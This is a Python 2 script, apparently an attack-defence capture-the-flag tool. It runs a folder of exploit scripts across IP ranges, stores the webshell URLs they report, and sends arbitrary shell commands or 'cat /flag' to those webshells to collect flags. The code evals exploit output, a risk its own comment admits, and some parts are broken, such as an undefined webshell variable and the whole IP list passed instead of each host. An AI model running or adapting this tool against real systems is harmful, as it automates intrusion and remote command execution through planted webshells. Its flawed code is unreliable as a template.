# _*_ coding: utf8 _*_

import re
import os
import pickle
import popen2
import requests

flag_pattern = re.compile('flag\{.*\}')

class Attack():
    def __init__(self):
        try:
            with open('data/ip_list.pickle','r') as fp:
                self.ip_list = pickle.load(fp)
            with open('data/exploits.pickle','r') as fp:
                self.exploits = pickle.load(fp)
            with open('data/webshell_data.pickle','r') as fp:
                self.webshell_data = pickle.load(fp)
            with open('data/flag.pickle','r') as fp:
                self.flag = pickle.load(fp)
        
        except:
            self.ip_list = {}
            self.exploits = []
            self.webshell_data = {}
            self.flag = []

    # 设置ip的方法，1.1.x.1     1.1.1.x
    def set_ip_1(self,ad_server_name,ip,port,num):  # check if ip in the list
        self.ip_list[ad_server_name] = []
        for i in range(int(num)):
            url = 'http://'+ip.replace('x',str(i))+':'+port
            self.ip_list[ad_server_name].append(url)
        with open('data/ip_list.pickle','wb') as fp:
            pickle.dump(self.ip_list,fp)

    # 载入exp
    def load_exp(self): # feature
        for root, dirs, files in os.walk('./exp'):
            for i in files:
                self.exploits.append(i)
        with open('data/exploits.pickle','wb') as fp:
            pickle.dump(self.exploits,fp)

    # threading     ip传参问题
    def exploit(self,ad_server_name,exp):
        ip = self.ip_list[ad_server_name]
        for i in ip:    
            print i
            # cmd = 'dir'
            try:
                cmd = 'python2 ' + './exp/' + exp.replace('.py','') + '.py ' + str(ip)
                fr,fw,fe = popen2.popen3(cmd)  # popen3
                # print fr.read()
                # rce 警告 嘻嘻嘻
                tmp = eval(fr.read())
                if tmp:
                    if tmp[0]:
                        self.flag.append(tmp[0])
                    if tmp[1]:
                        self.webshell_data[tmp[1]] = i + str('/.config.php')

                # 保存flag 保存webshell_url
                fe.close()
                fr.close()
                fw.close()
            except:
                print fe.read()
                fe.close()
                fr.close()
                fw.close()

        with open('data/webshell_data.pickle','wb') as fp:
            pickle.dump(self.webshell_data,fp)
        with open('data/flag.pickle','wb') as fp:
            pickle.dump(self.flag,fp)

    def submit_flag(self):
        if self.flag:
            # 自己写
            pass

    def manage_shell(self,cmd,flag='0'):
        if self.webshell_data:
            for passwd,url in webshell_data:
                if flag == '1':
                    try:
                        r = requests.post(url=url,data={passwd:'cat /flag'})
                        f = flag_pattern.findall(r.content)[0]
                        self.flag.append(f)
                    except:
                        print 'miaomiaomiao'
                else:
                    try:
                        r = requests.post(url=url,data={passwd:cmd})
                        print r.content
                    except:
                        print 'miaomiaomiao'
                        
            with open('data/flag.pickle','wb') as fp:
                pickle.dump(self.flag,fp)

    

